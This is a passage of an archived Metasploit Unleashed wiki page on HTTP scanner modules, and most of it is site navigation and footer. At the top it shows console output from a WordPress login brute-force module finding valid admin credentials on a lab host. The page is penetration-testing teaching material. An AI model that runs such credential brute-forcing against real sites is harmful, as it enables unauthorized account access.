+<span style='color:#ff0000;'>[-]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Failed to login as 'admin'
+<span style='color:#0000FF;'>[*]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - Trying username:'admin' with password:'s3cr3t'
+<span style='color:#00ff00;'>[+]</span> http://192.168.1.201:80/wordpress/wp-login.php - WordPress Brute Force - SUCCESSFUL login for 'admin' : 's3cr3t'
+<span style='color:#0000FF;'>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>wordpress_login_enum</span>) ></pre>
+<br />
+We can see in the above output that the module is efficient as it only brute-forces passwords against valid usernames and our scan did indeed turn up a valid set of credentials.
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="http://www.offensive-security.com/w/index.php?title=Module_Reference&amp;action=edit&amp;redlink=1" class="new" title="Module Reference (page does not exist)">Module Reference</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Auxiliary_Modules&amp;action=edit&amp;redlink=1" class="new" title="Auxiliary Modules (page does not exist)">Auxiliary Modules</a> &gt; <a href="http://www.offensive-security.com/w/index.php?title=Scanner_Modules&amp;action=edit&amp;redlink=1" class="new" title="Scanner Modules (page does not exist)">Scanner Modules</a> &gt; Scanner HTTP Auxiliary Modules</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="http://www.offensive-security.com/w/index.php?title=DCERPC&amp;action=edit&amp;redlink=1" class="new" title="DCERPC (page does not exist)">DCERPC</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Discovery&amp;action=edit&amp;redlink=1" class="new" title="Discovery (page does not exist)">Discovery</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=FTP&amp;action=edit&amp;redlink=1" class="new" title="FTP (page does not exist)">FTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=HTTP&amp;action=edit&amp;redlink=1" class="new" title="HTTP (page does not exist)">HTTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=IMAP&amp;action=edit&amp;redlink=1" class="new" title="IMAP (page does not exist)">IMAP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=MSSQL&amp;action=edit&amp;redlink=1" class="new" title="MSSQL (page does not exist)">MSSQL</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=MySQL&amp;action=edit&amp;redlink=1" class="new" title="MySQL (page does not exist)">MySQL</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=NetBIOS&amp;action=edit&amp;redlink=1" class="new" title="NetBIOS (page does not exist)">NetBIOS</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=POP3&amp;action=edit&amp;redlink=1" class="new" title="POP3 (page does not exist)">POP3</a> &#124; <a href="Port_Scanners" title="Port Scanners" class="mw-redirect">Port Scanners</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SMB&amp;action=edit&amp;redlink=1" class="new" title="SMB (page does not exist)">SMB</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SMTP&amp;action=edit&amp;redlink=1" class="new" title="SMTP (page does not exist)">SMTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SNMP&amp;action=edit&amp;redlink=1" class="new" title="SNMP (page does not exist)">SNMP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=SSH&amp;action=edit&amp;redlink=1" class="new" title="SSH (page does not exist)">SSH</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=Telnet&amp;action=edit&amp;redlink=1" class="new" title="Telnet (page does not exist)">Telnet</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=TFTP&amp;action=edit&amp;redlink=1" class="new" title="TFTP (page does not exist)">TFTP</a> &#124; <a href="http://www.offensive-security.com/w/index.php?title=VNC&amp;action=edit&amp;redlink=1" class="new" title="VNC (page does not exist)">VNC</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<!-- 
+NewPP limit report
+Preprocessor visited node count: 1019/1000000
+Preprocessor generated node count: 3661/1000000
+Post‐expand include size: 5460/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 3/40
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:243-0!*!0!!en!*!* and timestamp 20131124113630 -->
+</div><div class="printfooter">
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Scanner_HTTP_Auxiliary_Modules&amp;oldid=1251">http://www.offensive-security.com/w/index.php?title=Scanner_HTTP_Auxiliary_Modules&amp;oldid=1251</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Scanner_Modules&amp;action=edit&amp;redlink=1" class="new" title="Category:Scanner Modules (page does not exist)">Scanner Modules</a></li></ul></div></div>							<!-- end content -->
+													</div>
+						
+					</div>
+				
+					<div id="left-box">
+								<ul id="nav">
+				<li><a href="Donate" class="root">Donate</a></li>
+				<li>
+					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
+					<div class="menu two-column">
+						<h3>Introduction</h3>
+						<ul class="one">
+							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
+								<ul class="two small">
+									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
+									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
+									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
+									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
+								</ul>
+							</li>
+						</ul>
+						<div class="clear"></div>
+					</div>
+				</li>
+				<li>
+					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
+					<div class="menu two-column">
+						<h3>Required Materials</h3>
+						<ul class="one">
+							<li><a href="Metasploitable">Metasploitable</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
+					<div class="menu four-column">
+						<h3>Metasploit Fundamentals</h3>
+						<ul class="one">
+							<li><a href="Msfcli">Msfcli</a></li>
+							<li><a href="Msfconsole">Msfconsole</a>
+								<ul class="two small">
+									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Exploits">Exploits</a>
+								<ul class="two">
+									<li><a href="Using_Exploits">Using Exploits</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Payloads">Payloads</a>
+								<ul class="two small">
+									<li><a href="Payload_Types">Payload Types</a></li>
+									<li><a href="Generating_Payloads">Generating Payloads</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+                                                        <li><a href="Databases">Databases</a>
+                                                                <ul class="two small">
+                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+							<li><a href="About_Meterpreter">About Meterpreter</a>
+								<ul class="two">
+									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+						<div class="clear"></div>
+					</div>
+				</li>
+				<li>
+				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
+					<div class="menu two-column">
+						<h3>Information Gathering</h3>
+						<ul class="one">
+							<li><a href="Port_Scanning">Port Scanning</a></li>
+							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
+							<li><a href="Service_Identification">Service Identification</a></li>
+							<li><a href="Password_Sniffing">Password Sniffing</a>
+								<ul class="two">
+									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
+							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
+					<div class="menu two-column">
+						<h3>Vulnerability Scanning</h3>
+						<ul class="one">
+							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
+							<li><a href="VNC_Authentication">VNC Authentication</a></li>
+							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
+							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
+		     		                                <ul class="two small">
+                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+							</li>
+                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
+								<ul class="two small">
+									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
+					<div class="menu two-column">
+						<h3>Writing a Simple Fuzzer</h3>
+						<ul class="one">
+							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
+							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
+					<div class="menu two-column">
+						<h3>Exploit Development</h3>
+						<ul class="one">
+							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
+							<li><a href="Exploit_Format">Exploit Format</a></li>
+							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
+							<li><a href="Exploit_Targets">Exploit Targets</a></li>
+							<li><a href="Exploit_Payloads">Exploit Payloads</a>
+								<ul class="two small">
+									<li><a href="Msfvenom">Msfvenom</a></li>
+									<li><a href="Msfpayload">Msfpayload</a></li>
+									<li><a href="Msfencode">Msfencode</a></li>
+									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
+									<li><a href="Msfrop">Msfrop</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
+								<ul class="two small">
+									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
+								<ul class="two small">
+									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Porting_Exploits">Porting Exploits</a></li>
+						</ul>
+					</div>
+				</li>
+                                <li>
+                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
+                                        <div class="menu two-column">
+                                                <h3>Client-side Exploits</h3>
+                                                <ul class="one">
+                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
+                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
+                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
+                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
+                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
+                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
+                                                </ul>
+                                        </div>
+                                </li>
+				<li>
+					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
+					<div class="menu three-column">
+						<h3>Client Side Attacks</h3>
+						<ul class="one">
+							<li><a href="Binary_Payloads">Binary Payloads</a></li>
+							<ul class="two small">
+								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
+							</ul>
+							<div class="clear"></div>
+							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
+							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
+					<div class="menu two-column">
+						<h3>MSF Post Exploitation</h3>
+						<ul class="one">
+							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
+							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
+							<li><a href="Event_Log_Management">Event Log Management</a></li>
+							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
+							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
+								<ul class="two small">
+									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
+							<li><a href="Packet_Sniffing">Packet Sniffing</a></li>
+							<li><a href="Pivoting">Pivoting</a></li>
+                                                                <ul class="two small">
+                                                                        <li><a href="Portfwd">Portfwd</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+							<li><a href="TimeStomp">TimeStomp</a></li>
+							<li><a href="Screen_Capture">Screen Capture</a></li>
+							<li><a href="Searching_For_Content">Searching For Content</a></li>
+							<li><a href="John_The_Ripper">John The Ripper</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Meterpreter_Scripting" class="root"><span class="chapter">11</span> Meterpreter Scripting</a>
+					<div class="menu two-column">
+						<h3>Meterpreter Scripting</h3>
+						<ul class="one">
+							<li><a href="Existing_Scripts">Existing Scripts</a></li>
+							<li><a href="Writing_Meterpreter_Scripts">Writing Meterpreter Scripts</a></li>
+							<li><a href="Custom_Scripting">Custom Scripting</a></li>
+							<li><a href="Useful_API_Calls">Useful API Calls</a></li>
+							<li><a href="Useful_Functions">Useful Functions</a></li>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="Maintaining_Access" class="root"><span class="chapter">12</span> Maintaining Access</a>
+					<div class="menu two-column">
+						<h3>Maintaining Access</h3>
+						<ul class="one">
+							<li><a href="Keylogging">Keylogging</a></li>
+							<li><a href="Meterpreter_Backdoor">Meterpreter Backdoor</a></li>
+							<li><a href="Persistent_Backdoors">Persistent Backdoors</a></li>
+						        <ul class="two small">
+								 <li><a href="Netcat_Backdoor">Netcat Backdoor</a></li>
+		 						 <li><a href="Meterpreter_Service">Meterpreter Service</a></li>
+							</ul>
+								 <div class="clear"></div>
+						</ul>
+					</div>
+				</li>
+				<li>
+					<a href="MSF_Extended_Usage" class="root"><span class="chapter">13</span> MSF Extended Usage</a>
+					<div class="menu two-column">
+						<h3>MSF Extended Usage</h3>
+						<ul class="one">
+							<li><a href="PHP_Meterpreter">PHP Meterpreter</a></li>
+							<li><a href="Backdooring_EXE_Files">Backdooring EXE Files</a></li>
+							<li><a href="Karmetasploit">Karmetasploit</a>
+								<ul class="two small">
+									<li><a href="Karmetasploit_Configuration">Configuration</a></li>
+									<li><a href="Karmetasploit_In_Action">Karmetasploit in Action</a></li>
+									<li><a href="Attack_Analysis">Attack Analysis</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+							<li><a href="MSF_vs_OS_X">MSF vs OS X</a></li>
+							<li><a href="File-Upload_Backdoors">File-Upload Backdoors</a></li>
+							<li><a href="Building_A_Module">Building A Module</a>
+								<ul class="two small">
+									<li><a href="Payloads_Through_MSSQL">Payloads Through MSSQL</a></li>
+									<li><a href="Creating_Our_Auxiliary_Module">Creating Our Auxiliary Module</a></li>
+									<li><a href="The_Guts_Behind_It">The Guts Behind It</a></li>
+								</ul>
+								<div class="clear"></div>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li>
+                                        <a href="Metasploit_GUIs" class="root"><span class="chapter">14</span> Metasploit GUIs</a>
+					<div class="menu two-column">
+						<h3>Metasploit GUIs</h3>
+						<ul class="one">
+							<li><a href="MSF_Community_Edition">MSF Community Edition</a>
+								<ul class="two small">
+                                                                        <li><a href="Scanning">Scanning</a></li>
+                                                                        <li><a href="Exploitation">Exploitation</a></li>
+                                                                        <li><a href="Post_Exploitation">Post Exploitation</a></li>
+                                                                </ul>
+								<div class="clear"></div>
+                                                        </li>
+							<li><a href="Armitage">Armitage</a>
+                                                                <ul class="two small">
+                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
+                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
+                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
+                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
+								</ul>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li><a href="About_The_Authors" class="root">About The Authors</a>
+					<div class="menu two-column">
+						<h3>About the Authors</h3>
+						<ul class="one">
+							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
+							<li><a href="William_Coppola">William Coppola</a></li>
+							<li><a href="Paul_Hand">Paul Hand</a></li>
+							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
+							<li><a href="Devon_Kearns">Devon Kearns</a></li>
+							<li><a href="David_Kennedy">David Kennedy</a></li>
+							<li><a href="Steven_McElrea">Steven McElrea</a></li>
+							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
+							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
+							<li><a href="David_Ovitz">David Ovitz</a></li>
+							<li><a href="Carlos_Perez">Carlos Perez</a></li>
+						</ul>
+					</div>
+				</li>
+                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
+                                        <div class="menu three-column">
+                                                <h3>Post Module Reference</h3>
+                                                <ul class="one">
+                                                        <li>Windows   
+                                                                <ul class="two">
+                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
+                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
+                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Linux
+                                                                <ul class="two">
+                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
+                                                                </ul>
+								                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>OS X
+                                                                <ul class="two">
+                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
+                                                                </ul>
+					                                			<div class="clear"></div>
+                                                        </li>
+                                                        <li>Multiple OS
+                                                                <ul class="two">
+                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
+                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
+                                                                </ul>
+							                                	<div class="clear"></div>
+                                                        </li>
+                                                </ul>
+                                        </div>
+                                </li>
+                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
+                                        <div class="menu four-column">
+                                                <h3>Auxiliary Module Reference</h3>
+                                                <ul class="one">
+                                                        <li>Admin   
+                                                                <ul class="two">
+                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
+                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
+                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
+                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
+                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Scanner
+                                                                <ul class="two">
+                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
+                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
+                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
+                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
+                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
+                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
+                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
+                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
+                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
+                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
+                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
+                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
+                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
+                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
+                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
+                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
+                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
+                                                                </ul>
+								                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Server
+                                                                <ul class="two">
+                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
+                                                                </ul>
+					                                			<div class="clear"></div>
+                                                        </li>
+                                                </ul>
+                                        </div>
+                                </li>
+			<br />
+			<br />
+			<br />
+			<br />
+			</ul>
+													</div>
+				
+					<div class="clear"></div>
+				</div>
+
+				<div id="footer">
+					<div id="footer-content">
+						<div class="left">
+							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
+						</div>
+						<div class="right">
+							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
+						</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+			
+		</div>
+<script>if(window.mw){
+mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
+}</script>
+<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-1981501-1");
+pageTracker._trackPageview();
+</script><!-- Served in 0.157 secs. --></body></html>
